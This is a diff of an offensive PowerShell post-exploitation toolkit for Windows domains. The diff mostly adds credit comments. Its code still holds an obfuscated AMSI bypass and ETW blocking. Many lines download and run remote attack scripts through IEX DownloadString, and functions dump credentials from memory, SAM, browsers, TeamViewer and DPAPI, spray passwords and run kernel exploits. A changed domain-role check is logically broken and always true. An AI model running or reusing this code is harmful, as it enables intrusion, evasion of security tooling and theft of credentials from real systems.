@@ -1,6 +1,7 @@
 
 function AmsiBypass
 {
+    #This is Matt Graebers Reflection method bypass with changes to triggers 
     (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
 }
 
@@ -49,7 +50,7 @@ function dependencychecks
         
         $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
         
-        if($systemRoleID -ne 1){
+        if(($systemRoleID -ne 1) -or ($systemRoleID -ne 3) -or ($systemRoleID -ne 4) -or ($systemRoleID -ne 5)){
         
                 "       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n"
                               
@@ -102,6 +103,7 @@ function sharpcradle{
         [switch]
         $noninteractive
     )
+    
     pathcheck
     BlockEtw
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -332,6 +334,7 @@ function adidns
         $remove
 	)
     pathcheck
+    # Kevin-Robertsons Powermad for Node creation
     IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Powermad.ps1")
     if ($addwildcard)
     {
@@ -366,7 +369,7 @@ function sessionGopher
 {
     <#
     .DESCRIPTION
-        Starts SessionGopher to search for Cached Credentials.
+        Starts slightly obfuscated SessionGopher to search for Cached Credentials.
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -419,7 +422,7 @@ function kittielocal
 {
     <#
     .DESCRIPTION
-        Dumps Credentials from Memory / Registry / SAM Database.
+        Dumps Credentials from Memory / Registry / SAM Database / Browsers / Files / DPAPI.
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -541,6 +544,7 @@ function decryptteamviewer
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
+    # Wrote this Script myself, credit goes to @whynotsecurity - https://whynotsecurity.com/blog/teamviewer/
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
     TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
     Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
@@ -643,7 +647,7 @@ function kernelexploits
 {
 <#
         .DESCRIPTION
-        Get a SYSTEM Shell using Kernel exploits.
+        Get a SYSTEM Shell using Kernel exploits. Most binaries are the original poc exploits loaded via Invoke-Refl3ctiv3Pe!njection + obfuscated afterwards for @msi bypass
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -892,7 +896,7 @@ function localreconmodules
     )
 
 
-           
+            # Looking for Event logs via  djhohnsteins c# eventlog parser ported to powershell
             function powershellsensitive
             {
             	Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
@@ -902,7 +906,8 @@ function localreconmodules
             	Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' >> "$currentPath\LocalRecon\Powershell_Logs.txt" 
 	    	if (isadmin){[EventLogParser.EventLogHelpers]::Parse4688Events()}
             }
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
+            
+            # obfuscated + string replaced p0werview
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
 
             function generalrecon{
@@ -923,7 +928,7 @@ function localreconmodules
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
             Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"
 
-            #Collecting Informations
+            #Collecting usefull Informations
             Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
             systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
             Write-Host -ForegroundColor Yellow 'Getting Patches'
@@ -952,6 +957,7 @@ function localreconmodules
 	    get-content $env:windir\System32\drivers\etc\hosts | out-string  >> "$currentPath\LocalRecon\etc_Hosts_Content.txt"
 	    Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ >> "$currentPath\LocalRecon\Test_for_Argument_Injection.txt"
 	    
+        #Stolen and integrated from 411Hall's JAWS
 	    Write-Host -ForegroundColor Yellow 'Searching for files with Full Control and Modify Access'
 	    Function Get-FireWallRule
     	    {
@@ -1102,6 +1108,7 @@ function localreconmodules
 
            function dotnet{
                 Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
+                #Lee Christensen's .NET Binary searcher
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-DotNetServices.ps1')
                 Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
             }
@@ -1114,6 +1121,10 @@ function localreconmodules
                 {
                     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                 }
+                
+                # P0wersploits local recon function
+                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
+            
                 Write-Host -ForegroundColor Yellow 'Saving general computer information to .\LocalRecon\Computerdetails.txt:'
                 Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"
 
@@ -1124,7 +1135,7 @@ function localreconmodules
 
          
             function sensitivefiles{
-            
+                
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/find-interesting.ps1')
                 Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
                 try{Find-InterestingFile -Path 'C:\' >> "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
@@ -1144,6 +1155,7 @@ function localreconmodules
             if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'}
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
+                # Lee Christensen's Chrome-Dump Script
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
                 try
                 {
@@ -1166,6 +1178,7 @@ function localreconmodules
             if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'}
             if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
             {
+                # Stolen from Steve Borosh @rvrsh3ll
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
                 Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
             }
@@ -1371,7 +1384,7 @@ function passhunt
 {
 <#
         .DESCRIPTION
-        Search for hashed or cleartext passwords on the local system or on the domain.
+        Search for hashed or cleartext passwords on the local system or on the domain using Dionachs passhunt.
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -1391,6 +1404,7 @@ function passhunt
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    # P0werspl0its p0werview obfuscated + string replaced
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
 
         if ($domain)
@@ -1471,6 +1485,7 @@ function domainreconmodules
 
 
  function generaldomaininfo{
+            
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
             $domain_Name = skulked
@@ -1484,7 +1499,7 @@ function domainreconmodules
             Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
             inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"
 
-            #Powerview
+            #P0werview functions, string replaced version
             Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
 	    try{
             skulked >> "$currentPath\DomainRecon\NetDomain.txt"
@@ -1672,6 +1687,7 @@ __        ___       ____
 
 function Snaffler
 {
+    # @l0ss and @Sh3r4 - snaffler
     [CmdletBinding()]
 
     Param
@@ -1704,6 +1720,7 @@ function Snaffler
 
 function spoolvulnscan
 {
+    #leechristensens Spoolsample scanner & Exploitation
 
     [CmdletBinding()]
 
@@ -1786,6 +1803,7 @@ function spoolvulnscan
 
 function GPORemoteAccessPolicy
 {
+    # Stolen from https://github.com/FSecureLABS
     [CmdletBinding()]
     Param (
         [Switch]
@@ -1840,7 +1858,7 @@ function GPOAudit
 {
 <#
         .DESCRIPTION
-        Check Group Policies for common misconfigurations using Grouper2.
+        Check Group Policies for common misconfigurations using Grouper2 from l0ss.
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -1854,6 +1872,7 @@ function GPOAudit
 
 function reconAD
 {
+    # sense-of-security - ADRecon
     pathcheck
     Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
@@ -1865,7 +1884,7 @@ function bluekeep
 {
 <#
         .DESCRIPTION
-        Search AD for pingable Windows servers and Check if they are vulnerable to bluekeep.
+        Search AD for pingable Windows servers and Check if they are vulnerable to bluekeep. Original script by https://github.com/vletoux @Pingcastle
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -1939,7 +1958,7 @@ function MS17-10
 {
 <#
         .DESCRIPTION
-        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10.
+        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10. Original script by https://github.com/vletoux @PingCastle
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -2015,7 +2034,7 @@ function powerSQL
 {
 <#
         .DESCRIPTION
-        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction.
+        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction. Original Scipt from https://github.com/NetSPI/
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -2088,7 +2107,7 @@ function sharphound
 {
 <#
         .DESCRIPTION
-        Downloads Sharphound.exe and collects All AD-Information for Bloodhound.
+        Downloads Sharphound.exe and collects All AD-Information for Bloodhound https://github.com/BloodHoundAD
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
@@ -2106,6 +2125,7 @@ function oldchecks
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
+    # Sherlock script, P0werUp Scipt, Get-GPP Scripts from p0werspl0it + credential manager dump
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/locksher.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/UpPower.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/GPpass.ps1')
@@ -2139,6 +2159,7 @@ function oldchecks
 
 function itm4nprivesc
 {
+    # Stolen and obfuscated from https://github.com/itm4n/PrivescCheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/IkeextCheck.ps1')
@@ -2164,6 +2185,8 @@ function otherchecks
     
     wmic qfe get InstalledOn | Sort-Object { $_ -as [datetime] } | Select -Last 1 >> $currentPath\LocalPrivEsc\LastPatchDate.txt
     
+    # Stolen somewhere.
+
     Write "Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading:"
     $result = $null
     $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
@@ -2273,6 +2296,7 @@ function otherchecks
 
 function winPEAS
 {
+    # https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS wrapped in powershell
     [CmdletBinding()]
     Param (
         [Switch]
